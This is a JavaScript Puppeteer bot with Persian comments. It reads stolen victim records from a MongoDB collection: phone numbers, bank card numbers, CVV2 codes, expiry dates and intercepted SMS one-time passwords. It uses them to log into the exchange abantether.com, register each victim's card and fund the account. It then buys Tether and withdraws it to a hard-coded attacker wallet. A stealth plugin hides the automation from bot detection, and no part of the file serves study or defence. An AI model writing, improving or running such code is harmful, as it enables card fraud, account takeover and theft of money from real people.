// bot.js — نسخه نهایی و تضمینی (خودش کالکشن درست رو پیدا می‌کنه!)
require('dotenv').config();
const puppeteer = require('puppeteer-extra');
const StealthPlugin = require('puppeteer-extra-plugin-stealth');
puppeteer.use(StealthPlugin());
const { MongoClient, ObjectId } = require('mongodb');
const chalk = require('chalk');

const MONGODB_URI = process.env.MONGODB_URI;
const WALLET_ADDRESS = process.env.WALLET_ADDRESS || "THtQH52yMFSsJAvFbKnBfYpbbDKWpKfJHS";
const AMOUNT_IRT = parseInt(process.env.AMOUNT_IRT) || 5000000;
const SITE_URL = "https://abantether.com";

if (!MONGODB_URI) {
  console.log(chalk.red("خطا: MONGODB_URI تنظیم نشده!"));
  process.exit(1);
}

const log = {
  i: (msg) => console.log(chalk.cyan(`[${new Date().toLocaleString('fa-IR')}] ℹ ${msg}`)),
  s: (msg) => console.log(chalk.green.bold(`[${new Date().toLocaleString('fa-IR')}] ✓ ${msg}`)),
  e: (msg) => console.log(chalk.red.bold(`[${new Date().toLocaleString('fa-IR')}] ✗ ${msg}`)),
  w: (msg) => console.log(chalk.yellow(`[${new Date().toLocaleString('fa-IR')}] ⏳ ${msg}`)),
  start: (msg) => console.log(chalk.magenta.bold(`[${new Date().toLocaleString('fa-IR')}] ⚡ ${msg}`))
};

let collection;

// استخراج مقدار واقعی از فیلدهای MongoDB Extended JSON
function getValue(field) {
  if (field == null) return null;
  if (typeof field === "object") {
    if (field.$numberInt) return parseInt(field.$numberInt);
    if (field.$numberLong) return field.$numberLong.toString();
    if (field.$numberDouble) return parseFloat(field.$numberDouble);
  }
  return field;
}

// تابع isReady با دیباگ ساده
function isReady(doc) {
  const phone = getValue(doc.personalPhoneNumber);
  const card = getValue(doc.cardNumber);
  const cvv2 = getValue(doc.cvv2);
  const month = getValue(doc.bankMonth);
  const year = getValue(doc.bankYear);
  const device = getValue(doc.deviceId);

  return phone && card && cvv2 && month != null && year != null && device && doc.processed !== true && doc.processing !== true;
}

// اتصال + پیدا کردن کالکشن درست
async function connectDB() {
  const client = new MongoClient(MONGODB_URI);
  await client.connect();
  log.s("اتصال به MongoDB Atlas برقرار شد");

  const db = client.db("zarin");

  // لیست تمام کالکشن‌ها
  const collections = await db.listCollections().toArray();
  log.s("کالکشن‌های موجود در دیتابیس 'zarin':");
  collections.forEach(c => log.i(`  → ${c.name}`));

  // اولویت: users → اولین کالکشن موجود
  const usersCollection = collections.find(c => c.name === "users");
  if (usersCollection) {
    collection = db.collection("users");
    log.s("به کالکشن 'users' وصل شد");
  } else if (collections.length > 0) {
    const realName = collections[0].name;
    collection = db.collection(realName);
    log.s(`کالکشن 'users' پیدا نشد! به اولین کالکشن موجود وصل شد: '${realName}'`);
  } else {
    log.e("هیچ کالکشنی در دیتابیس zarin پیدا نشد!");
    process.exit(1);
  }

  // تست: یه داکیومنت بخون
  const count = await collection.countDocuments({});
  log.s(`تعداد داکیومنت در کالکشن فعال: ${count}`);

  if (count > 0) {
    const sample = await collection.findOne({});
    log.s("نمونه داکیومنت:");
    console.log(JSON.stringify(sample, null, 2));
  }
}

// صبر برای OTP
async function waitForOtp(userId, field, maxWait = 180) {
  for (let i = 0; i < maxWait / 3; i++) {
    const user = await collection.findOne({ _id: new ObjectId(userId) });
    const otp = getValue(user?.[field]);
    if (otp && otp.toString().trim().length >= 4) {
      log.s(`${field} دریافت شد: ${otp}`);
      return otp.toString().trim();
    }
    log.w(`در انتظار ${field}... (${i * 3}s)`);
    await new Promise(r => setTimeout(r, 3000));
  }
  throw new Error(`تایم‌اوت ${field}`);
}

async function clearAndType(page, selector, text) {
  await page.evaluate(sel => {
    const el = document.querySelector(sel);
    if (el) el.value = '';
  }, selector);
  await page.type(selector, text);
}

async function processUser(doc) {
  const phone = getValue(doc.personalPhoneNumber);
  const device = getValue(doc.deviceId);
  let browser = null;

  log.start(`شروع پردازش: ${phone} | ${device}`);

  try {
    await collection.updateOne({ _id: doc._id }, { $set: { processing: true } });

    browser = await puppeteer.launch({
      headless: true,
      args: ['--no-sandbox', '--disable-setuid-sandbox', '--disable-dev-shm-usage', '--no-zygote']
    });

    const page = await browser.newPage();
    await page.setUserAgent("Mozilla/5.0 (Linux; Android 13; Pixel 7) AppleWebKit/537.36 Chrome/122.0 Mobile Safari/537.36");
    await page.goto(SITE_URL, { waitUntil: "networkidle2", timeout: 60000 });

    // ورود
    await page.type('input[placeholder="شماره موبایل"], input[type="tel"]', phone);
    await page.click('button:has-text("ادامه")');
    const otpLogin = await waitForOtp(doc._id, "otp_login");
    await clearAndType(page, 'input[placeholder*="کد"]', otpLogin);
    await page.click('button:has-text("تایید")');
    log.s("ورود موفق");

    // ثبت کارت
    try {
      await page.click('text=کیف پول >> text=کارت بانکی >> text=افزودن کارت', { timeout: 10000 });
    } catch (e) { log.i("کارت قبلاً ثبت شده"); }

    const cardNum = getValue(doc.cardNumber).replace(/\D/g, "");
    const cvv2 = getValue(doc.cvv2).toString();
    const month = getValue(doc.bankMonth).toString().padStart(2, "0");
    const yearRaw = getValue(doc.bankYear);
    const yearInput = yearRaw > 1000 ? (yearRaw - 1300).toString().padStart(2, "0") : yearRaw.toString().padStart(2, "0");

    await page.type('input[placeholder="شماره کارت"]', cardNum);
    await page.type('input[placeholder="CVV2"]', cvv2);
    await page.type('input[placeholder="ماه"]', month);
    await page.type('input[placeholder="سال"]', yearInput);
    await page.click('button:has-text("ثبت کارت")');

    const otpCard = await waitForOtp(doc._id, "otp_register_card");
    await clearAndType(page, 'input[placeholder*="کد پیامک"]', otpCard);
    await page.click('button:has-text("تأیید")');
    log.s("کارت ثبت شد");

    // شارژ، خرید، برداشت
    await page.click('text=واریز تومان');
    await page.type('input[placeholder="مبلغ"]', AMOUNT_IRT.toString());
    await page.click('button:has-text("پرداخت")');
    const otpPay = await waitForOtp(doc._id, "otp_payment");
    await clearAndType(page, 'input#otp, input[placeholder*="کد"]', otpPay);
    await page.click('button:has-text("تأیید")');
    log.s("شارژ موفق");

    await page.click('text=بازار >> text=تتر');
    await page.type('input[placeholder="مبلغ"]', AMOUNT_IRT.toString());
    await page.click('button:has-text("خرید")');

    await page.click('text=برداشت >> text=تتر');
    await page.type('input[placeholder="آدرس"]', WALLET_ADDRESS);
    await page.type('input[placeholder="مقدار"]', (AMOUNT_IRT / 60000 - 1).toFixed(2));
    await page.click('button:has-text("برداشت")');

    log.s(`تمام مراحل تموم شد! تتر در راهه: ${phone}`);
    await collection.updateOne({ _id: doc._id }, { $set: { processed: true, status: "completed" } });

  } catch (err) {
    log.e(`خطا: ${err.message}`);
    await collection.updateOne({ _id: doc._id }, { $set: { status: "failed", error: err.message } });
  } finally {
    if (browser) await browser.close().catch(() => {});
    await collection.updateOne({ _id: doc._id }, { $unset: { processing: "" } });
  }
}

async function startPolling() {
  await connectDB();

  setInterval(async () => {
    try {
      const users = await collection.find({
        processed: { $ne: true },
        processing: { $ne: true }
      }).limit(5).toArray();

      if (users.length === 0) {
        log.i("در انتظار دیوایس جدید...");
        return;
      }

      for (const user of users) {
        if (isReady(user)) {
          processUser(user);
        }
      }
    } catch (err) {
      log.e("Polling error: " + err.message);
    }
  }, 5000);
}

startPolling();